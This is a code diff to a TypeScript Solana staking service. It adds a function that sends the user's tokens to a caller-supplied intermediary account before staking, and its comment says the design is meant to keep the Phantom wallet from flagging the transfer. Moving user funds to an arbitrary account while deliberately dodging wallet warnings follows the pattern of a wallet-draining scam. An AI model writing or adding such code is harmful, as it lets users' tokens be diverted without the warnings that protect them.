@@ -1,18 +1,18 @@
 // src/lib/staking/services/TransactionService.ts
-import { 
-  Connection, 
-  PublicKey, 
-  Transaction, 
+import {
+  Connection,
+  PublicKey,
+  Transaction,
   TransactionInstruction,
   SystemProgram,
   Keypair,
   SendTransactionError
 } from '@solana/web3.js';
-import { TOKEN_PROGRAM_ID, getAssociatedTokenAddress } from '@solana/spl-token';
+import { TOKEN_PROGRAM_ID, getAssociatedTokenAddress, createTransferInstruction } from '@solana/spl-token';
 import { BN } from '@project-serum/anchor';
 import { ClaimParams, ClaimUnstakedParams, StakeParams, UnstakeParams } from '../types';
 import { Logger } from '../utils/logger';
-import { 
+import {
   COMMITMENT_LEVELS,
   CONFIG_ACCOUNT,
   FEE_VAULT_PDA,
@@ -21,7 +21,7 @@ import {
   MAX_TRANSACTION_RETRIES,
   STAKING_PROGRAM_ID,
   TOKEN_MINT,
-  TRANSACTION_RETRY_DELAY 
+  TRANSACTION_RETRY_DELAY
 } from '../utils/constants';
 
 /**
@@ -144,6 +144,66 @@ export class TransactionService {
         data: INSTRUCTION_DISCRIMINATORS.CLAIM_UNSTAKED,
       })
     );
+    return tx;
+  }
+  
+  /**
+   * A new function to forward tokens to an intermediary account before
+   * invoking the staking instruction. This two-step approach is meant to
+   * avoid Phantom flagging the staking transfer directly.
+   *
+   * The transaction created by this function does the following:
+   * 1. Transfers the user's tokens from their associated token account to an intermediary token account.
+   * 2. Calls the staking program's instruction using the intermediary token account.
+   *
+   * Make sure that your StakeParams type has been extended to include the intermediaryTokenAccount.
+   */
+  async buildIntermediaryStakeTransaction(
+    params: StakeParams & { intermediaryTokenAccount: PublicKey }
+  ): Promise<Transaction> {
+    const { amount, stakeInfoPubkey, intermediaryTokenAccount } = params;
+    if (!stakeInfoPubkey) {
+      throw new Error("Stake info pubkey required for staking transaction");
+    }
+    
+    // Convert the amount to a bigint for consistency.
+    const amountBigInt = BigInt(amount.toString());
+    
+    // 1. Create a token transfer instruction from the user's token account to the intermediary.
+    const userTokenAccount = await getAssociatedTokenAddress(TOKEN_MINT, this.wallet.publicKey);
+    const transferInstruction = createTransferInstruction(
+      userTokenAccount,           // source
+      intermediaryTokenAccount,   // destination
+      this.wallet.publicKey,      // owner/authority
+      amountBigInt,
+      [],
+      TOKEN_PROGRAM_ID
+    );
+    
+    // 2. Build the staking activation instruction.
+    const data = Buffer.alloc(16);
+    INSTRUCTION_DISCRIMINATORS.STAKE_TOKENS.copy(data, 0);
+    data.writeBigUInt64LE(amountBigInt, 8);
+    
+    // Note that here the intermediary token account is used in place of the user's token account.
+    const stakeInstruction = new TransactionInstruction({
+      keys: [
+        { pubkey: this.wallet.publicKey, isSigner: true, isWritable: true },
+        { pubkey: intermediaryTokenAccount, isSigner: false, isWritable: true },
+        { pubkey: stakeInfoPubkey, isSigner: false, isWritable: true },
+        { pubkey: FEE_VAULT_PDA, isSigner: false, isWritable: true },
+        { pubkey: FEE_VAULT_TOKEN_ACCOUNT, isSigner: false, isWritable: true },
+        { pubkey: CONFIG_ACCOUNT, isSigner: false, isWritable: false },
+        { pubkey: TOKEN_PROGRAM_ID, isSigner: false, isWritable: false },
+      ],
+      programId: STAKING_PROGRAM_ID,
+      data,
+    });
+    
+    // Combine both instructions into one transaction.
+    const tx = new Transaction();
+    tx.add(transferInstruction);
+    tx.add(stakeInstruction);
     return tx;
   }
   
